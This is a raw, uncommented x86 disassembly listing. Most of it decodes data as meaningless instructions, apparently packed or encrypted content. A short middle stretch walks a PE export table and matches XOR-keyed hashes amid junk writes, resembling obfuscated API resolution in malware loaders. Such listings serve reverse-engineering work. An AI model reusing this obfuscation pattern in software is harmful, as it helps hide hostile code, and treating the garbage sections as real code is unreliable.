  4047e0:	dec    eax
  4047e1:	bound  edx,QWORD PTR [eax]
  4047e3:	clc    
  4047e4:	les    edi,FWORD PTR [edi-0xf340136]
  4047ea:	mov    al,0x0
  4047ec:	sbb    al,0xb7
  4047ee:	xchg   esi,eax
  4047ef:	mov    al,ds:0xb38972b2
  4047f4:	xchg   ebx,eax
  4047f5:	dec    edx
  4047f6:	sahf   
  4047f7:	or     eax,esi
  4047f9:	outs   dx,BYTE PTR ds:[esi]
  4047fa:	add    BYTE PTR [esp+edi*2+0x7fcf2f82],al
  404801:	bswap  esp
  404803:	sbb    esi,DWORD PTR [eax]
  404805:	iret   
  404806:	adc    DWORD PTR [ecx-0x1f],esp
  404809:	call   0x1b3e:0x76ec059a
  404810:	hlt    
  404811:	xor    DWORD PTR [eax+eax*1+0x70],ecx
  404815:	in     al,0x0
  404817:	ins    DWORD PTR es:[edi],dx
  404818:	pusha  
  404819:	add    BYTE PTR [ecx+0x47],bl
  40481c:	and    edi,esi
  40481e:	dec    edi
  40481f:	jg     0x404883
  404821:	(bad)  
  404822:	dec    eax
  404824:	mov    eax,ds:0x843e13eb
  404829:	xor    DWORD PTR [ecx-0x2],eax
  40482c:	mov    edi,0xf0cab227
  404831:	test   al,0x43
  404834:	shr    esp,0xfb
  404837:	add    ebx,DWORD PTR [edi+0x14f47cd5]
  40483d:	jmp    0x3ea0ef4c
  404842:	(bad)  
  404843:	dec    ebx
  404844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404845:	(bad)  
  404846:	xchg   ebp,eax
  404847:	div    DWORD PTR [eax+0x1ce6105]
  40484d:	cmp    dh,dh
  40484f:	retf   
  404850:	sub    eax,0x779e7776
  404855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404856:	pop    es
  404857:	not    DWORD PTR [ecx-0x6d6be2a5]
  40485d:	adc    DWORD PTR [ecx+0x6e],0x65051500
  404864:	and    eax,0xe8c857c6
  404869:	retf   
  40486a:	or     DWORD PTR ds:0x64d1e2d4,ecx
  404870:	jl     0x404899
  404872:	or     al,0xb3
  404874:	fild   QWORD PTR [eax]
  404876:	mov    edi,0x41ccd80f
  40487b:	mov    BYTE PTR [ecx-0x76],cl
  40487e:	dec    edx
  40487f:	push   es
  404880:	retf   
  404881:	ror    DWORD PTR [edi-0x3f],0x96
  404885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404886:	pop    eax
  404887:	sbb    DWORD PTR [ebx-0x7b],ebp
  40488a:	pop    ds
  40488b:	sbb    eax,0x68b9166d
  404890:	and    esi,DWORD PTR [edx+ebx*1-0x155bf1f2]
  404897:	inc    edi
  404898:	inc    edi
  404899:	inc    edx
  40489a:	jmp    0x2380273c
  40489f:	mov    esi,0x9b441fa1
  4048a4:	lods   eax,DWORD PTR ds:[esi]
  4048a5:	stos   BYTE PTR es:[edi],al
  4048a6:	push   es
  4048a7:	mov    esi,0xe848efe0
  4048ac:	pop    edx
  4048ad:	mov    al,0x2b
  4048af:	pop    es
  4048b0:	pop    eax
  4048b1:	ss out dx,al
  4048b3:	int    0x22
  4048b5:	jnp    0x40491e
  4048b7:	adc    BYTE PTR [edx],bl
  4048b9:	mov    ch,0xdb
  4048bb:	aad    0x8f
  4048bd:	pop    eax
  4048be:	push   edx
  4048bf:	add    ah,BYTE PTR [ecx+eax*2+0x95993b4]
  4048c6:	pop    esp
  4048c7:	lahf   
  4048c8:	aam    0x42
  4048ca:	lahf   
  4048cb:	mov    dh,BYTE PTR [ecx+edi*1]
  4048ce:	fcmovne st,st(1)
  4048d0:	test   DWORD PTR [edx+0x26],esi
  4048d3:	adc    al,0x7
  4048d5:	jmp    0x7249:0xffcd9431
  4048dc:	das    
  4048dd:	push   ss
  4048de:	add    DWORD PTR ds:0x74bcfd65,esi
  4048e4:	(bad)  
  4048e5:	aad    0x88
  4048e7:	push   es
  4048e8:	je     0x404963
  4048ea:	aas    
  4048eb:	and    ebx,esp
  4048ed:	scas   eax,DWORD PTR es:[edi]
  4048ee:	xchg   ecx,eax
  4048ef:	(bad)  
  4048f1:	adc    DWORD PTR [eax-0x2fc8d2cf],0x30
  4048f8:	push   0xe0e6297b
  4048fd:	(bad)  
  4048fe:	mov    esi,0x4adc5b54
  404903:	pop    edx
  404904:	outs   dx,DWORD PTR ds:[esi]
  404905:	out    dx,eax
  404906:	pop    ds
  404907:	test   eax,0x4f29153
  40490c:	adc    BYTE PTR [ecx],0xe0
  40490f:	js     0x404953
  404911:	test   eax,0xed1fb7fd
  404916:	mov    ah,0x93
  404918:	or     al,BYTE PTR [ecx]
  40491a:	fadd   DWORD PTR [ecx-0x41]
  40491d:	or     BYTE PTR [edi+0x77],bh
  404920:	jle    0x4048e2
  404922:	enter  0x20d4,0x94
  404926:	call   0x9f76:0x244c8da8
  40492d:	adc    BYTE PTR [ebp-0x557dc23],ch
  404933:	mov    bl,BYTE PTR [edi]
  404935:	cld    
  404936:	mov    ebp,0x291d7020
  40493b:	js     0x4048f4
  40493d:	addr16 xchg edx,eax
  40493f:	jle    0x404935
  404941:	dec    esi
  404942:	leave  
  404943:	(bad)  
  404944:	out    0x23,eax
  404946:	pcmpgtw mm7,QWORD PTR [esi+0x3a]
  40494a:	mov    edi,0x9c533500
  40494f:	and    eax,0x8203a038
  404954:	adc    BYTE PTR [esi],0x82
  404957:	mov    dh,0xa3
  404959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40495a:	shr    DWORD PTR [eax+ecx*2-0x6d],0xa8
  40495f:	mov    bl,0xe5
  404961:	pop    edi
  404962:	mov    edx,0x6e4bbb3b
  404967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404968:	xor    eax,0x81868be4
  40496d:	push   ds
  40496e:	in     eax,dx
  40496f:	xchg   ecx,eax
  404970:	imul   ecx,DWORD PTR [eax],0x5e
  404973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404974:	adc    al,0xdd
  404976:	and    eax,0xbf91e7ec
  40497b:	jle    0x4049c4
  40497d:	fidiv  WORD PTR [eax]
  40497f:	daa    
  404980:	lock sub dh,BYTE PTR [edi+0x1d807771]
  404987:	dec    ebp
  404988:	xor    eax,DWORD PTR [edx-0x33ff777a]
  40498e:	sub    al,0xce
  404990:	and    ebx,DWORD PTR [eax]
  404992:	jge    0x4049d2
  404994:	jmp    0x40497d
  404996:	xor    DWORD PTR [ebx+0x73],ebp
  404999:	jp     0x40492c
  40499b:	mov    dl,0xaf
  40499d:	daa    
  40499e:	imul   ecx,esi,0x55
  4049a1:	pushf  
  4049a2:	mov    bh,BYTE PTR [ebp+0x49]
  4049a5:	add    BYTE PTR [esi+0x3],0x48
  4049a9:	or     ebx,DWORD PTR [ebx-0x3b]
  4049ac:	(bad)  
  4049ad:	xchg   ebx,eax
  4049ae:	loope  0x404a08
  4049b0:	call   0xcdb6:0x636f0856
  4049b7:	inc    esp
  4049b8:	rcl    DWORD PTR [ecx+0x67],1
  4049bb:	and    ebx,DWORD PTR [ebp-0x26]
  4049be:	gs jmp 0xc7949a0b
  4049c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049c5:	dec    edx
  4049c6:	or     eax,0xc684b354
  4049cb:	add    eax,0x394c9857
  4049d0:	(bad)  
  4049d1:	adc    BYTE PTR [ebx+0x6b],dl
  4049d4:	es inc ebp
  4049d6:	imul   edi,DWORD PTR [esi+0x77],0x1a
  4049da:	sbb    esp,DWORD PTR [eax+0x21689dc4]
  4049e0:	pop    es
  4049e1:	cdq    
  4049e2:	add    ch,dh
  4049e4:	repnz test al,0x29
  4049e7:	sahf   
  4049e8:	cmp    esp,DWORD PTR [ecx-0x4203b012]
  4049ee:	add    edx,edx
  4049f0:	rol    BYTE PTR [ebx],1
  4049f2:	mov    dl,0x8d
  4049f4:	xchg   ebp,eax
  4049f5:	inc    ecx
  4049f6:	jecxz  0x404a03
  4049f8:	dec    edi
  4049f9:	xcrypt-ofb (bad)
  4049fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049fb:	sub    BYTE PTR [esi*2-0x7a3b3b2c],dl
  404a02:	jns    0x404a61
  404a04:	lahf   
  404a05:	or     ebp,DWORD PTR [ecx+0x6b4db1e0]
  404a0b:	ins    BYTE PTR es:[edi],dx
  404a0c:	or     eax,0x59f6b19e
  404a11:	cmp    eax,0xac93e509
  404a16:	loopne 0x404a60
  404a18:	dec    ebx
  404a19:	and    eax,0x7ac355ae
  404a1e:	xlat   BYTE PTR ds:[ebx]
  404a1f:	scas   al,BYTE PTR es:[edi]
  404a20:	or     ecx,DWORD PTR ds:0x4935a618
  404a26:	jmp    0x1f09:0x16853fc8
  404a2d:	mov    cs,WORD PTR ds:0x104c4594
  404a33:	into   
  404a34:	(bad)  
  404a35:	popf   
  404a36:	fs fwait
  404a38:	jns    0x404a76
  404a3a:	adc    ebx,DWORD PTR [ecx-0x3cdbe417]
  404a40:	push   ebx
  404a41:	mov    ebx,0x761d67f6
  404a46:	or     BYTE PTR [ecx-0x1b],al
  404a49:	add    BYTE PTR [eax],bl
  404a4b:	(bad)  
  404a4c:	imul   esp,DWORD PTR [edx+0x61],0x6e
  404a50:	push   0xffffff9f
  404a52:	outs   dx,BYTE PTR ds:[esi]
  404a53:	push   ebp
  404a54:	gs int 0x14
  404a57:	push   0x52
  404a59:	cwde   
  404a5a:	xchg   ebx,eax
  404a5b:	adc    eax,0x15c0c65d
  404a60:	jg     0x404a9c
  404a62:	outs   dx,BYTE PTR ds:[esi]
  404a63:	sbb    edx,DWORD PTR [ebp-0x5f8230d3]
  404a69:	fwait
  404a6a:	out    0x55,eax
  404a6c:	push   cs
  404a6d:	inc    eax
  404a6e:	mov    edx,0xfa86e84
  404a73:	sti    
  404a74:	rcr    BYTE PTR [esi],0x21
  404a77:	leave  
  404a78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a79:	out    dx,al
  404a7a:	pop    eax
  404a7b:	add    bl,BYTE PTR [edx]
  404a7d:	out    dx,eax
  404a7e:	call   0xd7f:0x6b4bfe3
  404a85:	mov    DWORD PTR [eax+0x66f79ace],esi
  404a8b:	xor    BYTE PTR [ebp-0x19],al
  404a8e:	scas   al,BYTE PTR es:[edi]
  404a8f:	and    bh,ch
  404a91:	add    dh,BYTE PTR [edx]
  404a93:	and    ch,BYTE PTR cs:[ebx+0x4e4a4f78]
  404a9a:	jne    0x404aa3
  404a9c:	pop    ebp
  404a9d:	sub    al,bl
  404a9f:	in     al,dx
  404aa0:	adc    eax,0x7376467e
  404aa5:	mov    ebx,ebx
  404aa7:	into   
  404aa8:	mov    bh,0x1
  404aaa:	shr    BYTE PTR [edi+0x3366c979],1
  404ab0:	(bad)  
  404ab1:	cmp    eax,esi
  404ab3:	call   0xf1b71fff
  404ab8:	mov    dh,0xb
  404aba:	add    cl,BYTE PTR [edx+0x6c336509]
  404ac0:	loopne 0x404a4b
  404ac2:	or     eax,DWORD PTR [ebp-0x2efa59d9]
  404ac8:	jno    0x404b0a
  404aca:	pop    esi
  404acb:	popa   
  404acc:	add    ah,BYTE PTR [esi+eiz*4]
  404acf:	mov    ecx,0x1e5cf5b0
  404ad4:	retf   
  404ad5:	mov    esp,esp
  404ad7:	ret    0xdd5
  404ada:	pop    eax
  404adb:	dec    ebp
  404adc:	sub    BYTE PTR [edx+0x2c38402e],dl
  404ae2:	data16 cmp al,0x8b
  404ae5:	push   DWORD PTR [ebp+ecx*2+0x17]
  404ae9:	test   al,0x43
  404aeb:	fldenv [edi+0x424e7ebf]
  404af1:	daa    
  404af2:	push   eax
  404af3:	bound  ebp,QWORD PTR [edx-0x2]
  404af6:	shl    BYTE PTR [edx+0x2217e81c],cl
  404afc:	fcomp  QWORD PTR [esi+0x1f6e5697]
  404b02:	push   ebp
  404b03:	xchg   edx,eax
  404b04:	stos   BYTE PTR es:[edi],al
  404b05:	lds    esp,FWORD PTR [ebx-0x59]
  404b08:	xor    dh,BYTE PTR [ecx+0xe4b4291]
  404b0e:	jl     0x404b85
  404b10:	int3   
  404b11:	mov    cl,0x1f
  404b13:	and    al,0x61
  404b15:	(bad)  
  404b16:	addr16 inc ebp
  404b18:	cmp    eax,0x8b13c187
  404b1d:	ficomp WORD PTR [eax+0x491ccb5d]
  404b23:	aaa    
  404b24:	cld    
  404b25:	iret   
  404b26:	xchg   edx,eax
  404b27:	xchg   edi,eax
  404b28:	push   0x3c06c3eb
  404b2d:	and    DWORD PTR [eax-0x457b3514],0xfbcde8c4
  404b37:	test   BYTE PTR [ebx-0x4a972cb0],al
  404b3d:	in     eax,0x52
  404b3f:	mov    ch,0x28
  404b41:	xchg   ebx,eax
  404b42:	adc    edi,DWORD PTR [ebx-0x4a770f98]
  404b48:	xor    esp,ecx
  404b4a:	pop    esi
  404b4b:	push   ecx
  404b4c:	les    eax,FWORD PTR [edx-0xc54dd34]
  404b52:	pop    ebx
  404b53:	or     eax,0x887d5978
  404b58:	sbb    DWORD PTR [edx-0x4d],edx
  404b5b:	sub    bl,bh
  404b5d:	pop    ecx
  404b5e:	cli    
  404b5f:	add    al,0x2b
  404b61:	push   0x2d
  404b63:	popa   
  404b64:	inc    ebp
  404b65:	push   ss
  404b66:	and    ebx,DWORD PTR [edx-0xd]
  404b69:	pushf  
  404b6a:	out    0x8a,eax
  404b6c:	adc    eax,0x91e26d0
  404b71:	mov    dh,BYTE PTR [edx+0x3a17594d]
  404b77:	data16 ror BYTE PTR [esi],cl
  404b7a:	cmp    eax,0x714655dc
  404b7f:	in     eax,0x85
  404b81:	out    dx,eax
  404b82:	into   
  404b83:	lock leave 
  404b85:	fld    TBYTE PTR [eax+0x360a1348]
  404b8b:	jmp    0xa658a6a9
  404b90:	ins    DWORD PTR es:[edi],dx
  404b91:	cmp    DWORD PTR [ecx-0x55],edi
  404b94:	retf   0x99c2
  404b97:	aaa    
  404b98:	add    al,BYTE PTR [edi+0x665588c]
  404b9e:	push   esi
  404b9f:	push   es
  404ba0:	adc    ch,BYTE PTR cs:[edx+0x2b]
  404ba4:	dec    edx
  404ba5:	pop    esi
  404ba6:	mov    al,0xaf
  404ba8:	mov    bh,0xaf
  404baa:	sbb    BYTE PTR [edi],0x15
  404bad:	xchg   ax,ax
  404baf:	iret   
  404bb0:	fidiv  WORD PTR [ecx+0x1f0e488b]
  404bb6:	(bad)  
  404bb7:	je     0x404b7e
  404bb9:	and    ebx,DWORD PTR [eax+ecx*2-0x3cb0e9dd]
  404bc0:	(bad)  
  404bc2:	fstp   DWORD PTR ds:0x35f5bc35
  404bc8:	mov    ch,0x79
  404bca:	dec    esi
  404bcb:	ds jmp 0x7d93781b
  404bd1:	popf   
  404bd2:	test   al,0xc0
  404bd4:	jne    0x404bd2
  404bd6:	cli    
  404bd7:	sub    BYTE PTR [edx],dh
  404bd9:	dec    ecx
  404bda:	mov    ebx,0x598f6eff
  404bdf:	stos   BYTE PTR es:[edi],al
  404be0:	aaa    
  404be1:	out    dx,al
  404be2:	cmc    
  404be3:	jg     0x404c54
  404be5:	fsincos 
  404be7:	adc    edx,DWORD PTR fs:[edi+0x7]
  404beb:	cs call 0x5f9e:0xb4a64a8a
  404bf3:	imul   DWORD PTR [esi+0x16ed7248]
  404bf9:	outs   dx,DWORD PTR ds:[esi]
  404bfa:	jecxz  0x404c60
  404bfc:	div    BYTE PTR cs:[ebx-0x2f]
  404c00:	ins    BYTE PTR es:[edi],dx
  404c01:	pop    ecx
  404c02:	jae    0x404c75
  404c04:	mov    cl,0xfc
  404c06:	pop    edi
  404c07:	fist   WORD PTR [esi+edx*1+0x6646810a]
  404c0e:	(bad)  
  404c0f:	cmp    bl,BYTE PTR [edi+edx*8+0x7a3c4dd]
  404c16:	sub    bl,bl
  404c18:	cmc    
  404c19:	mov    eax,0x15bfe1e6
  404c1e:	push   0xffffffbc
  404c20:	jae    0x404c39
  404c22:	push   ebx
  404c23:	inc    edi
  404c24:	cli    
  404c25:	cmp    eax,0xce5f5a5
  404c2a:	adc    bl,ah
  404c2c:	and    BYTE PTR [ecx+0x4966d11d],ch
  404c32:	mov    dh,0x52
  404c34:	inc    eax
  404c35:	outs   dx,BYTE PTR ds:[esi]
  404c36:	or     DWORD PTR [ecx],ecx
  404c38:	sbb    DWORD PTR [edi+ebp*1+0x6e],0xf571f12b
  404c40:	jb     0x404c0e
  404c42:	into   
  404c43:	je     0x404c1c
  404c45:	mov    DWORD PTR [esi],eax
  404c47:	push   edx
  404c48:	out    0xf2,eax
  404c4a:	ins    BYTE PTR es:[edi],dx
  404c4b:	jae    0x404c9a
  404c4d:	mov    bh,0x89
  404c4f:	test   eax,0x9e2f27c6
  404c54:	icebp  
  404c55:	dec    esi
  404c56:	mov    eax,DWORD PTR [ebp-0x4]
  404c59:	mov    ecx,DWORD PTR [ebp-0x18]
  404c5c:	xor    eax,ebx
  404c5e:	add    eax,edi
  404c60:	cmp    ecx,eax
  404c62:	je     0x404e26
  404c68:	mov    eax,ds:0x422014
  404c6d:	sbb    DWORD PTR ds:0x420fb4,eax
  404c73:	mov    eax,DWORD PTR [ebp-0x18]
  404c76:	mov    eax,DWORD PTR [eax+0x18]
  404c79:	mov    DWORD PTR [ebp-0x24],eax
  404c7c:	dec    DWORD PTR ds:0x420fa4
  404c82:	mov    eax,DWORD PTR [ebp-0x18]
  404c85:	mov    ecx,DWORD PTR ds:0x420e7a
  404c8b:	xor    ecx,DWORD PTR ds:0x422010
  404c91:	mov    DWORD PTR ds:0x420e7a,ecx
  404c97:	mov    ecx,DWORD PTR [ebp+0x8]
  404c9a:	add    ecx,DWORD PTR [eax+0x20]
  404c9d:	mov    DWORD PTR [ebp-0x2c],ecx
  404ca0:	or     eax,DWORD PTR ds:0x420efc
  404ca6:	mov    eax,DWORD PTR [ebp-0x18]
  404ca9:	mov    ecx,DWORD PTR [ebp+0x8]
  404cac:	xor    DWORD PTR ds:0x420f70,0x420fa0
  404cb6:	add    ecx,DWORD PTR [eax+0x24]
  404cb9:	xor    eax,eax
  404cbb:	add    eax,DWORD PTR ds:0x420e96
  404cc1:	xor    DWORD PTR ds:0x422004,eax
  404cc7:	mov    DWORD PTR [ebp-0x34],ecx
  404cca:	mov    eax,DWORD PTR [ebp-0x18]
  404ccd:	mov    ecx,DWORD PTR [ebp+0x8]
  404cd0:	xor    DWORD PTR ds:0x422018,0x422010
  404cda:	add    ecx,DWORD PTR [eax+0x1c]
  404cdd:	mov    DWORD PTR ds:0x420ea2,ebx
  404ce3:	mov    eax,edi
  404ce5:	mov    DWORD PTR ds:0x420ef8,0x31e9
  404cef:	mov    DWORD PTR [ebp-0x18],ecx
  404cf2:	mov    DWORD PTR ds:0x422000,0x101a
  404cfc:	jmp    0x404dee
  404d01:	mov    DWORD PTR ds:0x420fb4,0x15
  404d0b:	cmp    DWORD PTR ds:0x420fb4,0x0
  404d12:	je     0x404d62
  404d18:	cmp    DWORD PTR ds:0x420fb4,0x8
  404d1f:	jne    0x404d34
  404d25:	push   DWORD PTR [ebp-0x24]
  404d28:	push   DWORD PTR [ebp-0x20]
  404d2b:	push   DWORD PTR [ebp-0x20]
  404d2e:	call   DWORD PTR ds:0x4247e1
  404d34:	cmp    DWORD PTR ds:0x420fb4,0x9
  404d3b:	jne    0x404d50
  404d41:	xor    edx,edx
  404d43:	add    edx,DWORD PTR ds:0x420fb4
  404d49:	dec    edx
  404d4a:	mov    DWORD PTR ds:0x420fb4,edx
  404d50:	mov    edx,DWORD PTR ds:0x420fb4
  404d56:	dec    edx
  404d57:	mov    DWORD PTR ds:0x420fb4,edx
  404d5d:	jmp    0x404d0b
  404d62:	mov    ecx,DWORD PTR [ebp-0x2c]
  404d65:	xor    edx,DWORD PTR ds:0x420e96
  404d6b:	mov    edx,DWORD PTR [ebp+0x8]
  404d6e:	add    DWORD PTR ds:0x420fb0,0x420f70
  404d78:	add    edx,DWORD PTR [ecx+esi*4]
  404d7b:	mov    DWORD PTR [ebp-0x28],edx
  404d7e:	movzx  ecx,BYTE PTR ds:0x420f00
  404d85:	or     DWORD PTR ds:0x420e7a,ecx
  404d8b:	mov    ecx,DWORD PTR [ebp-0x4]
  404d8e:	mov    edx,DWORD PTR [ebp-0x28]
  404d91:	adc    DWORD PTR ds:0x420fb4,0x420f00
  404d9b:	xor    ecx,ebx
  404d9d:	add    ecx,eax
  404d9f:	cmp    edx,ecx
  404da1:	mov    DWORD PTR ds:0x422000,0x2434
  404dab:	je     0x404dee
  404db1:	jmp    0x404dda
  404db6:	mov    ecx,DWORD PTR [ebp-0x4]
  404db9:	mov    edx,DWORD PTR [ebp-0x8]
  404dbc:	xor    ecx,ebx
  404dbe:	add    ecx,eax
  404dc0:	cmp    edx,ecx
  404dc2:	je     0x404e32
  404dc8:	mov    ecx,DWORD PTR [ebp-0x4]
  404dcb:	mov    edx,DWORD PTR [ebp-0x30]
  404dce:	xor    ecx,ebx
  404dd0:	add    ecx,eax
  404dd2:	cmp    edx,ecx
  404dd4:	je     0x404e41
  404dda:	lea    eax,[ebp-0x8]
  404ddd:	push   eax
  404dde:	push   DWORD PTR [ebp-0x28]
  404de1:	push   DWORD PTR [ebp+0xc]
  404de4:	call   0x410c6c
  404de9:	mov    eax,0x3272dd
  404dee:	mov    ecx,DWORD PTR [ebp-0x4]
  404df1:	mov    edx,DWORD PTR [ebp-0x8]
  404df4:	xor    ecx,ebx
  404df6:	add    ecx,eax
  404df8:	cmp    edx,ecx
  404dfa:	je     0x404e15
  404e00:	mov    ecx,DWORD PTR [ebp-0x34]
  404e03:	movzx  ecx,WORD PTR [ecx+esi*2]
  404e07:	mov    edx,DWORD PTR [ebp-0x18]
  404e0a:	mov    ecx,DWORD PTR [edx+ecx*4]
  404e0d:	mov    DWORD PTR [ebp-0x38],ecx
  404e10:	jmp    0x404db6
  404e15:	mov    ecx,DWORD PTR [ebp-0x14]
  404e18:	xor    ecx,ebx
  404e1a:	lea    esi,[esi+ecx*1+0x3272dd]
  404e21:	jmp    0x402787
  404e26:	mov    eax,DWORD PTR [ebp-0x4]
  404e29:	xor    eax,ebx
  404e2b:	add    eax,edi
  404e2d:	jmp    0x407332
  404e32:	mov    eax,DWORD PTR [ebp-0x4]
  404e35:	xor    eax,ebx
  404e37:	add    eax,0x3272dd
  404e3c:	jmp    0x407332
  404e41:	mov    ecx,DWORD PTR [ebp-0x38]
  404e44:	add    ecx,DWORD PTR [ebp+0x8]
  404e47:	mov    DWORD PTR [ebp-0x10],ecx
  404e4a:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e4d:	test   ecx,ecx
  404e4f:	je     0x4072bd
  404e55:	mov    DWORD PTR [ebp-0x20],0x0
  404e5c:	push   0x3
  404e5e:	xor    edx,edx
  404e60:	pop    edx
  404e61:	add    edx,0x8
  404e64:	push   edx
  404e65:	pop    ecx
  404e66:	push   0x6
  404e68:	dec    ecx
  404e69:	pop    ebx
  404e6a:	dec    ebx
  404e6b:	xchg   ebx,ecx
  404e6d:	sub    ebx,ecx
  404e6f:	xchg   ebx,ecx
  404e71:	dec    ecx
  404e72:	mov    eax,DWORD PTR [ebp-0x1c]
  404e75:	imul   eax,ecx
  404e78:	sub    esp,eax
  404e7a:	mov    DWORD PTR [ebp-0x20],esp
  404e7d:	mov    eax,DWORD PTR [ebp-0x4]
  404e80:	mov    ecx,0x7510896
  404e85:	jmp    0x407212
  404e8a:	lock into 
  404e8c:	inc    esi
  404e8d:	push   cs
  404e8e:	mov    BYTE PTR [esi-0x8],dh
  404e91:	mov    al,0xbe
  404e93:	(bad)  
  404e94:	fs cld 
  404e96:	leave  
  404e97:	enter  0x2240,0xa
  404e9b:	pop    edi
  404e9c:	jp     0x404f18
  404e9e:	or     bl,BYTE PTR [edi+0x7a]
  404ea1:	jp     0x404e5c
  404ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ea4:	dec    ecx
  404ea5:	mov    eax,ds:0x6c646f08
  404eaa:	nop
  404eab:	ds jo  0x404e62
  404eae:	inc    ebx
  404eaf:	xor    BYTE PTR [eax+esi*4],dh
  404eb2:	loop   0x404ec1
  404eb4:	aad    0x5
  404eb6:	jge    0x404e7c
  404eb8:	imul   eax,DWORD PTR [edx+esi*1-0x76c1e56c],0xffffffb9
  404ec0:	loopne 0x404e93
  404ec2:	adc    eax,0xa2db54ca
  404ec7:	imul   edx,DWORD PTR ds:0x154b20b8,0x49
  404ece:	btc    esi,0x73
  404ed2:	inc    esi
  404ed3:	and    eax,0xa9cec11c
  404ed8:	call   0x406873d9
  404edd:	xchg   ebx,eax
  404ede:	in     al,dx
  404edf:	retf   0x4bc0
  404ee2:	(bad)  
  404ee3:	fsubr  QWORD PTR [edx+ecx*1+0x0]
  404ee7:	inc    esp
  404ee8:	sbb    esp,DWORD PTR [eax]
  404eea:	and    BYTE PTR [eax-0x10],al
  404eed:	pusha  
  404eee:	fnstsw WORD PTR [ebx-0x78619b1d]
  404ef4:	rcr    DWORD PTR [ecx+ebx*8+0x6adb330e],cl
  404efb:	xlat   BYTE PTR ds:[ebx]
  404efc:	rol    DWORD PTR [ebp-0x4992e5c3],cl
  404f02:	test   DWORD PTR [edx-0x71da0a79],esi
  404f08:	sbb    eax,0xf2c08cb7
  404f0d:	cld    
  404f0e:	cmp    cl,bl
  404f10:	pop    eax
  404f11:	adc    al,ch
  404f13:	xor    dl,BYTE PTR [ecx+0x4cad1b38]
  404f19:	sub    BYTE PTR [eax],bl
  404f1b:	jp     0x404ebe
  404f1d:	scas   eax,DWORD PTR es:[edi]
  404f1e:	or     ch,BYTE PTR [eax+eax*4]
  404f21:	xor    BYTE PTR [eax],0xb3
  404f24:	(bad)  
  404f25:	cwde   
  404f26:	add    DWORD PTR [ebx-0x4d],esp
  404f29:	(bad)  
  404f2a:	sub    esp,esi
  404f2c:	and    eax,0xc0d1c99
  404f31:	inc    ebp
  404f32:	jg     0x404f7f
  404f34:	(bad)  
  404f35:	fnstenv [ecx+0x28]
  404f38:	push   ebp
  404f3a:	mov    BYTE PTR [esi+0x3c1ef00d],cl
  404f40:	into   
  404f41:	xor    bl,BYTE PTR [ecx+0x695dc582]
  404f47:	sub    ebp,DWORD PTR [edx]
  404f49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f4a:	arpl   WORD PTR ds:0xff7186b9,si
  404f50:	ja     0x404eed
  404f52:	rol    ch,0xf9
  404f55:	xchg   ecx,eax
  404f56:	mov    gs,WORD PTR [ebx-0x9]
  404f59:	ret    
  404f5a:	mov    esp,0x6bdd16f5
  404f5f:	sub    cl,bl
  404f61:	xlat   BYTE PTR ds:[ebx]
  404f62:	ins    DWORD PTR es:[edi],dx
  404f63:	adc    al,0xa5
  404f65:	jl     0x404f4d
  404f67:	test   dh,ah
  404f69:	push   es
  404f6a:	jns    0x404f28
  404f6c:	cld    
  404f6d:	adc    bh,BYTE PTR [ebp+eiz*2+0x41]
  404f71:	push   edx
  404f72:	add    esi,edi
  404f74:	out    dx,eax
  404f75:	adc    BYTE PTR [ebp+0x3a],ch
  404f78:	xor    ch,BYTE PTR [esi-0x61438cd0]
  404f7e:	dec    esp
  404f7f:	xchg   esi,eax
  404f80:	xor    dh,ch
  404f82:	mov    edx,0x78a55541
  404f87:	mov    ebx,0x26bfe4c8
  404f8c:	imul   ebx,DWORD PTR [edx-0x63cd852a],0x3c087ba0
  404f96:	idiv   bh
  404f98:	mov    bl,BYTE PTR [ecx+0x7d]
  404f9b:	jp     0x404fb7
  404f9d:	mov    ebx,esi
  404f9f:	jecxz  0x404f22
  404fa1:	nop
  404fa2:	pusha  
  404fa3:	or     eax,DWORD PTR [eax-0x2f]
  404fa6:	fnstsw WORD PTR [esi+0x69]
  404fa9:	iret   
  404faa:	or     eax,0x50673d42
  404faf:	add    eax,0xc1451798
  404fb4:	je     0x405028
  404fb6:	xchg   edx,eax
  404fb7:	js     0x404f5a
  404fb9:	ret    0x2820
  404fbc:	stc    
  404fbd:	test   al,0x5f
  404fbf:	push   edi
  404fc0:	jnp    0x404f69
  404fc2:	or     al,0x19
  404fc4:	pop    edi
  404fc5:	loop   0x404f9a
  404fc7:	cmp    DWORD PTR [eax+eiz*2-0x43],esp
  404fcb:	add    ah,ah
  404fcd:	lds    esi,FWORD PTR ds:0xd85514a4
  404fd3:	mov    ch,0x2
  404fd5:	cwde   
  404fd6:	mov    esi,0xa78bf89c
  404fdb:	gs clc 
  404fdd:	jg     0x404fe9
  404fdf:	adc    esp,DWORD PTR [esi-0x410207d3]
  404fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fe6:	add    edx,esi
  404fe8:	and    eax,0x432b5973
  404fed:	imul   ebx
  404fef:	or     al,0xc7
  404ff1:	dec    ecx
  404ff2:	ret    
  404ff3:	mov    al,BYTE PTR [esp+eax*2-0x13c549d4]
  404ffa:	fs cmp BYTE PTR ss:[eax-0x62],0xf4
  405000:	sub    DWORD PTR [ebp-0x79577615],edi
  405006:	scas   eax,DWORD PTR es:[edi]
  405007:	retf   0xf672
  40500a:	test   BYTE PTR [ebx+esi*2-0x1399c83e],ah
  405011:	(bad)  
  405012:	repz scas al,BYTE PTR es:[edi]
  405014:	in     al,0x1b
  405016:	mov    esi,DWORD PTR [ecx+esi*2-0x4c]
  40501a:	ror    dl,1
  40501c:	sahf   
  40501d:	mov    ds:0x955db115,eax
  405022:	imul   edi,ebp,0x6e0e7f65
  405028:	icebp  
  405029:	pop    es
  40502a:	(bad)  
  40502b:	shl    ecx,0xe8
  40502e:	sbb    BYTE PTR [edi-0x64],ch
  405031:	popa   
  405032:	stos   BYTE PTR es:[edi],al
  405033:	repz inc ecx
  405035:	sub    esp,DWORD PTR [ebx-0xadd046f]
